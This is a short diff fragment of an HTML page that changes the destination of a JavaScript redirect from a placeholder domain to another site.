@@ -34,7 +34,7 @@ return false;
 ...
 <script type="text/javascript">
  
-    window.location.href = "http://example2.com" //使用js跳转
+    window.location.href = "http://csymsy002.us.kg" //使用js跳转
  
 </script>
 </head>
